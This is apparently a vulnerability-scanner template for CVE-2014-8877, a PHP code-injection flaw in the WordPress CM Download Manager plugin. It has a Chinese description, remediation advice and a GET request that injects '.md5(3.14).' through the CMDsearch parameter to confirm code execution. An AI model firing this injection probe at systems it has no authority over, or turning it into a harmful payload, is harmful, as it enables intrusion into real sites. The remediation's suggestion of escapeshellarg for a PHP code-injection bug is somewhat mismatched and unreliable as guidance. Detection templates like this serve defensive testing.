id: CVE-2014-8877
info:
  name: WordPress_CM_Download_Manager_命令执行
  author:
  - l0ne1y
  description: |-
    WordPress Plugin CreativeMinds CM Downloads Manager 代码注入漏洞
    WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。CreativeMinds CM Downloads Manager是其中的一个下载管理插件。

    WordPress CreativeMinds CM Downloads Manager插件2.0.3及之前版本的lib/controllers/CmdownloadController.php脚本中的‘alterSearchQuery’函数存在安全漏洞，该漏洞源于‘PHP create_function’函数没有充分过滤‘CMDsearch’参数。远程攻击者可利用该漏洞执行任意PHP代码。
  severity: critical
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：https://wordpress.org/plugins/cm-download-manager/developers/

    临时修复方案：
    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
    2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: dsl
    dsl:
    - contains(body,"4beed3b9c4a886067de0e3a094246f78")
  matchers-condition: and
  path:
  - '{{BaseURL}}/cmdownloads/?CMDsearch=".md5(3.14)."'
  method: GET
